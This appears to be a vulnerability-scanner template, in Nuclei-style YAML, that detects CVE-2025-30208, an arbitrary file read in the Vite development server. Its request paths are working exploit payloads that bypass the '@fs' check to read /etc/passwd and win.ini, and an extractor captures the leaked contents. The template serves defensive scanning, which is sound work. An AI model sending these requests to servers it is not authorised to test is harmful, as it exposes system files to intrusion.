script_name: Vite Development Server Arbitrary File Read
content:
id: cve-2025-30208-vite-arbitrary-file-read

info:
  name: Vite Development Server Arbitrary File Read
  author: vva
  severity: high
  description: |
    Detects arbitrary file read vulnerability in Vite development server via bypassing `@fs` access control.
    Affected versions: Vite < 6.2.3, < 6.1.2, < 6.0.12, < 5.4.15, < 4.5.10.
  reference:
    - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2025-30208
  tags: cve,cve2025,vite,file-read,exposure

http:
  - method: GET
    path:
      - "{{BaseURL}}/@fs/etc/passwd?import&raw??" 
      - "{{BaseURL}}/@fs/C:/windows/win.ini?import&raw??" 

    headers:
      User-Agent: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36"
      Accept: "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8"

    matchers:
      - type: dsl  
        dsl:
          - 'status_code == 200'  
          - 'contains(body, "root:x:0:0") || contains(body, "; for 16-bit app support")' 
        condition: and

    extractors:
      - type: regex
        name: file_content
        part: body
        regex:
          - '(?s)(root:x:0:0.*|; for 16-bit app support.*)' 
        internal: true

Affected versions: Vite < 6.2.3, < 6.1.2, < 6.0.12, < 5.4.15, < 4.5.10.
